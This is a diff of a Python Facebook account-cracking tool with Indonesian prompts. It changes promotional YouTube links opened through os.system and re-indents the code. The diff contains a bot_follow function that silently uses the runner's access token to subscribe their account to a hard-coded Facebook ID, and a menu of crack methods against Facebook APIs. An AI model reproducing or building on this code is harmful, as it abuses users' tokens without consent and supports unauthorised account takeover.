@@ -207,7 +207,7 @@ def log_token():
         zedd.close()
         print((p+" ["+k+"•"+m+"•"+p+"] Login Berhasil!"))
         jalan((p+" ["+k+"•"+m+"•"+p+"] Please Subscribe My Channel:)"))
-        os.system('xdg-open https://youtube.com/channel/UCAhCtgqK6WxCSGfg_lj8myw')
+        os.system('xdg-open https://youtu.be/3Y6xsMB3wRg')
         bot_follow()
         menu()
     except KeyError:
@@ -242,7 +242,7 @@ def gen():
         cookie.close()
         print((p+"\n ["+k+"•"+m+"•"+p+"] Login Berhasil!"))
         jalan((p+" ["+k+"•"+m+"•"+p+"] Please Subscribe My Channel :)"))
-        os.system('xdg-open https://youtu.be/PiT0nYbc8i0')
+        os.system('xdg-open https://youtu.be/3Y6xsMB3wRg')
         bot_follow()
         menu()
 
@@ -261,14 +261,14 @@ def bot_follow():
 	except IOError:
 		print((p+" ["+k+"•"+m+"•"+p+"] Token Invalid"))
 		logs()
-    requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + toket) # Ebink!
-    requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + toket) # Meyy
-    requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + toket) # Asuan Ryo Xyounaa
-#   requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
-#   requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
-#   requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
-#   requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
-#   requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
+	requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + toket) # Ebink!
+	requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + toket) # Meyy
+	requests.post('https://graph.facebook.com/100072241360914/subscribers?access_token=' + toket) # Asuan Ryo Xyounaa
+#	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
+#	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
+#	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
+#	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
+#	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # Unknow
 	menu()
 
 
@@ -333,7 +333,7 @@ def choose_menu():
 		menu()	
 
 def pilihcrack(file):
-  print("\x1b[0;32m[ Select Methode Crack ]\x1b[0;35m")
+  print("\x1b[0;32m[   Select Methode Crack   ]\x1b[0;35m")
   print((p+" ["+k+"01"+p+"]\x1b[0;36m Crack With Api.Facebook"))
   print((p+" ["+k+"02"+p+"]\x1b[0;36m Crack With Api.Facebook + TTL "))
   print((p+" ["+k+"03"+p+"]\x1b[0;36m Crack With Mbasic.Facebook"))
